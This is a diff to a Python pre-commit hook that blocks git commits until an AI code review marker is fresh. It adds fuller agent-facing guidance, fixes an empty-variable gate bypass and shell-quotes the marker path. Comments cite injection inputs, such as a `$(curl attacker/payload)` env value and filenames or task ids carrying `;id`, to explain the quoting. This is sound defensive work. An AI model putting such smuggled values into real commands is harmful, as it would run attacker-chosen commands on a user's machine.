@@ -6,9 +6,39 @@ the current uncommitted state, by looking for a fresh marker file that the revie
 tool writes when it runs (and whose mtime is at least as new as the last change to
 the index/working tree). If no review marker is found, it blocks with a reminder.
 
-Wiring: have your review tool `touch` the marker on a successful run, e.g.
-  review --uncommitted && touch "$REVIEW_MARKER"
-The marker path is configurable via the REVIEW_MARKER env var; default below.
+Wiring (PRIMARY — zero manual touch): stage the specific files you changed (not `git add
+-A` — a broad add in a dirty/shared worktree can sweep in unrelated edits or untracked
+secrets), then let review-cli touch the marker for you on a successful review:
+  git add -- 'path/to/changed-file.py' && review diff --staged --task 'TICKET-CODE'
+Quote BOTH placeholders when you replace them with real values — the file path
+(`git add -- 'real/path.py'`, `--` first so a path starting with `-` isn't read as a flag)
+and the task code (`--task 'TICKET-CODE'`). Neither `git add` nor review-cli's `--task`
+sanitizes its argument, so an unquoted real value containing shell metacharacters (a
+filename like `fix;id.py`, a task id copied from an untrusted integration as `OPS-7;id`)
+would execute as a second shell command if pasted bare.
+A task code is REQUIRED by the current review-cli, supplied EITHER as `--task 'CODE'`
+(shown above) OR by exporting `REVIEW_TASK_CODE='CODE'` first (quote it there too — same
+metacharacter risk) and omitting `--task` — either form scopes the review's own iteration
+history; omitting BOTH exits nonzero before any
+review runs and touches no marker at all (review-cli's own review-cli#180-class guard).
+review-cli's `_touch_review_marker()` (reviewlib/install.py, wired into
+`_stamp_if_staged_commit_review`) writes REVIEW_MARKER itself, in Python, the moment a
+`--staged` review passes — no `touch` command, no shell substitution, nothing for an agent
+to construct or get wrong. This is the reason `--staged` matters here too: an unstaged
+`review diff` (no `--staged`) does NOT touch the marker (see reviewlib/modes/review.py) —
+reviewing only the working tree while forgetting `--staged` is the most common way agents
+end up hand-rolling a `touch` afterward, which is what invites the worktree-guard trap
+below. Prefer `--staged --task 'CODE'` over a manual touch whenever you actually have a
+reviewer and a task code to run it against.
+
+Fallback (manual touch, only when no reviewer ran the review — e.g. a human already
+reviewed it): the marker path is configurable via the REVIEW_MARKER env var, default below.
+In a worktree-isolated Claude Code session, write the touch with NO shell substitution at
+all (no `$(...)`, no `${...}`, no bare `$VAR`) — the CLI's own worktree guard refuses those
+shapes regardless of git involvement. If REVIEW_MARKER might be overridden, resolve it
+first with a separate `printenv REVIEW_MARKER` call (a plain string arg, not an expansion,
+so it always passes the guard), then `touch` whatever literal path it printed (or this
+default if empty) as its own flat command. See README.md for the full recipe.
 
 What is NOT gated (so the reminder stays honest and unobtrusive):
   - Anything that is not a real `git commit` SEGMENT — `git stash`, `git worktree`,
@@ -153,7 +183,12 @@ def warn(msg: str) -> None:
 
 
 def marker_path() -> Path:
-    return Path(os.path.expanduser(os.environ.get("REVIEW_MARKER", DEFAULT_MARKER)))
+    # `.get(..., DEFAULT_MARKER)` alone would NOT apply the default for `REVIEW_MARKER=""`
+    # (explicitly set to empty — os.environ.get returns "" itself, not None, so the default
+    # arg never kicks in) — that resolves to Path("") == cwd, and `_marker_is_fresh()` would
+    # then treat cwd's OWN mtime as the marker (silent gate bypass on any recent write). `or`
+    # normalizes empty-string the same as unset.
+    return Path(os.path.expanduser(os.environ.get("REVIEW_MARKER") or DEFAULT_MARKER))
 
 
 # ── argv parsing — scope skip/env/message detection to the real `git commit` segment ─────────
@@ -724,12 +759,32 @@ def _marker_is_fresh() -> bool | None:
 
 
 def _block(prefix: str | None = None) -> int:
-    marker = marker_path()
+    # shlex.quote before it lands in a runnable-looking `touch …` snippet: REVIEW_MARKER is
+    # env-controlled, and an unquoted value containing shell metacharacters (e.g.
+    # `$(curl attacker/payload)`) would turn this hint into a copy-pasteable injection if an
+    # agent ran it verbatim outside a worktree-isolated session.
+    marker = shlex.quote(str(marker_path()))
     body = (
-        "No recent AI code review found for this change. Run a review on the "
-        "uncommitted diff (e.g. `review` / `codex exec review --uncommitted`) and "
-        f"address its findings before committing. (Set/touch {marker} on a successful "
-        "review, or set REVIEW_MARKER. A PURE-docs commit auto-allows — but only the simple "
+        "No recent AI code review found for this change. PRIMARY fix: `git add -- "
+        "'real/path.py'` for each file you changed (not `git add -A` — a broad add can "
+        "sweep in unrelated edits or secrets), then `review diff --staged --task "
+        "'TICKET-CODE'` (quote BOTH the real path and the real task code when you fill "
+        "them in — neither `git add` nor `--task` sanitizes its argument, so an unquoted "
+        "value with shell metacharacters would run as a second command; a task code is "
+        "REQUIRED by review-cli, given via `--task 'CODE'` or by exporting "
+        "`REVIEW_TASK_CODE='CODE'` first (quote that too) — without either the command "
+        "exits nonzero and touches no "
+        "marker at all) — a passing STAGED review-cli run touches the marker for you "
+        "internally (no `touch` needed, no shell substitution at all); an UNSTAGED `review "
+        "diff` (no `--staged`) does NOT touch it, which is the #1 reason this gate fires "
+        f"right after a review that looked clean. FALLBACK only (Set/touch {marker} "
+        "yourself — e.g. a human already reviewed, no agent reviewer ran): in a "
+        "worktree-isolated session write that touch with NO `$()`/`${...}`/bare `$VAR` — "
+        "the CLI's own worktree guard refuses those shapes even with zero git involved. If "
+        "REVIEW_MARKER may be overridden, resolve it first with a separate `printenv "
+        "REVIEW_MARKER` call, then `touch` the literal path it printed (or this default if "
+        "empty) as its own flat command. A PURE-docs commit "
+        "auto-allows — but only the simple "
         "form: `git commit -a`/`-am`, a trailing pathspec, or a preceding `git add` of other "
         "files FORFEITS that fast-path (the commit may include un-reviewed non-docs changes), "
         "so a docs-only diff can still land here — stage just the docs and `git commit` them "
